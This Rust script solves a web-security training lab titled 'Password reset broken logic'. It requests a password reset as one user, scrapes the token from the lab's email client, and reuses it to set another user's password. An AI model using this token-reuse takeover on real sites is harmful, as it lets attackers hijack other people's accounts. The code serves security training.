/****************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 26/8/2023
*
* Lab: Password reset broken logic
*
* Steps: 1. Send forgot-password request as wiener
*        2. Extract the token from the email client
*        3. Send change-password request as carlos
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aa4008704cbed1182e95b8000d200d9.web-security-academy.net";

    // change this to your email client URL
    let email_client = "https://exploit-0a6f00cf041fed2082ce5a14012f00df.exploit-server.net/email";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // make a forgot-password request as wiener
    let post_forgot_password = client
        .post(format!("{url}/forgot-password"))
        .form(&HashMap::from([("username", "wiener")]))
        .send();

    // if the request is successful
    if let Ok(post_res) = post_forgot_password {
        println!(
            "{}",
            "1. Send forgot-password request as wiener.. OK"
                .white()
                .bold()
        );

        // get the email client page to extract toke from
        let get_email_client = client.get(email_client).send();

        // if the request is successful
        if let Ok(get_res) = get_email_client {
            // extract the token from the page
            let token =
                extract_pattern("temp-forgot-password-token=(.*)'", &get_res.text().unwrap());

            // set the new password
            // change this to what you want
            let new_password = "Hacked";

            println!(
                "{}",
                "2. Extract the token from the email client.. OK"
                    .white()
                    .bold()
            );

            // make a change-password request as carlos
            let post_change_password = client
                .post(format!("{url}/forgot-password"))
                .form(&HashMap::from([
                    ("temp-forgot-password-token", token),
                    ("username", "carlos".to_string()),
                    ("new-password-1", new_password.to_string()),
                    ("new-password-2", new_password.to_string()),
                ]))
                .send();

            // if the request is successful
            if let Ok(change_res) = post_change_password {
                println!(
                    "{}",
                    "3. Send change-password request as carlos.. OK"
                        .white()
                        .bold()
                );
                println!(
                    "{}: {}",
                    "Carlos's password is changed successfully to".green().bold(),
                    new_password.green().bold()
                )
            } else {
                println!("{}", "Change password request has failed".red().bold());
            }
        } else {
            println!("{}", "Extract token request has failed".red().bold());
        }
    } else {
        println!("{}", "Forgot password request has failed".red().bold());
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/****************************************************
* Function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
